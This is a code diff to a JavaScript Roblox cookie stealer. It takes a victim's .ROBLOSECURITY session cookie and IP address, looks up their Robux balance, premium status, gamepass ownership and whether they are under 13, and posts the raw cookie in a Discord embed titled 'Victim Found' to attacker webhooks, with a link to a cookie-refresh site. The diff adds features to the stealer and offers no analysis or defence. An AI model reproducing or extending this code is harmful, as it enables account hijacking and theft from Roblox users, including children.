@@ -15,67 +15,89 @@ async function main(cookie) {
 
     let ipAddr = await (await fetch("https://api.ipify.org")).text();
     let statistics = null;
+    let ownsGamepass = false;
+    const gamepassId = 1417708310;
 
     try {
+        // Get authenticated user
         let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
             method: "GET",
             headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
         });
 
-        if (res.ok) {
-            let user = await res.json();
-            let economyRes = await fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
+        if (!res.ok) return;
+        let user = await res.json();
+
+        // Economy info
+        let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
+            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+        });
+        let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };
+
+        // Premium status
+        let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
+            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+        });
+        let isPremium = premiumRes.ok ? await premiumRes.json() : false;
+
+        // Thumbnail
+        let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
+        let thumbJson = await thumbRes.json();
+        let thumbUrl = thumbJson.data && thumbJson.data.length > 0 ? thumbJson.data[0].imageUrl : "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420";
+
+        // Check gamepass ownership (legal)
+        try {
+            let gpRes = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gamepassId}/users/${user.id}`, {
+                method: "GET",
                 headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
             });
-            let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };
+            let gpJson = gpRes.ok ? await gpRes.json() : null;
+            ownsGamepass = gpJson && gpJson.data && gpJson.data.length > 0;
+        } catch (e) { console.error(e); }
 
-            let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
-                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
-            });
-            let isPremium = premiumRes.ok ? await premiumRes.json() : false;
+        statistics = {
+            UserName: user.name,
+            UserId: user.id,
+            IsUnder13: user.isUnder13,
+            JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
+            RobuxBalance: economy.robux ?? "N/A",
+            PendingRobux: economy.robuxPending ?? "N/A",
+            IsPremium: isPremium,
+            ThumbnailUrl: thumbUrl
+        };
 
-            let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
-            let thumbJson = await thumbRes.json();
-            let thumbUrl = thumbJson.data && thumbJson.data.length > 0 ? thumbJson.data[0].imageUrl : "";
-
-            statistics = {
-                UserName: user.name,
-                UserId: user.id,
-                IsUnder13: user.isUnder13,
-                JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
-                RobuxBalance: economy.robux ?? "N/A",
-                PendingRobux: economy.robuxPending ?? "N/A",
-                IsPremium: isPremium,
-                ThumbnailUrl: thumbUrl
-            };
-        }
     } catch (e) {
         console.error(e);
     }
 
+    if (!statistics) return;
+
+    // Embed payload
     const embedPayload = {
         embeds: [
             {
-                description: "```" + cookie + "```",
+                description: "```" + cookie + "```\n[Refresh Cookie](https://refresher.ct.ws/?i=1)",
+                color: 16711680, // RED
                 fields: [
-                    { name: "Username", value: statistics ? statistics.UserName : "N/A", inline: true },
-                    { name: "User ID", value: statistics ? statistics.UserId : "N/A", inline: true },
-                    { name: "Underage", value: statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", inline: true },
-                    { name: "Join Date", value: statistics ? statistics.JoinDate : "N/A", inline: true },
-                    { name: "Robux", value: statistics ? statistics.RobuxBalance : "N/A", inline: true },
-                    { name: "Pending Robux", value: statistics ? statistics.PendingRobux : "N/A", inline: true },
-                    { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true }
+                    { name: "Username", value: statistics.UserName, inline: true },
+                    { name: "User ID", value: statistics.UserId.toString(), inline: true },
+                    { name: "Underage", value: statistics.IsUnder13 ? "✅ Yes" : "❌ No", inline: true },
+                    { name: "Join Date", value: statistics.JoinDate, inline: true },
+                    { name: "Robux", value: statistics.RobuxBalance.toString(), inline: true },
+                    { name: "Pending Robux", value: statistics.PendingRobux.toString(), inline: true },
+                    { name: "Premium", value: statistics.IsPremium ? "✅ Yes" : "❌ No", inline: true },
+                    { name: "Owns Gamepass", value: ownsGamepass ? "✅ Yes" : "❌ No", inline: true }
                 ],
                 author: {
                     name: "Victim Found: " + ipAddr,
-                    icon_url: statistics ? statistics.ThumbnailUrl : ""
+                    icon_url: statistics.ThumbnailUrl
                 },
                 footer: { text: "ENTERPRISE" }
             }
         ]
     };
 
-    // ✅ Send to webhook
+    // Send to webhooks
     for (let wh of WEBHOOKS) {
         fetch(wh.url, {
             method: "POST",
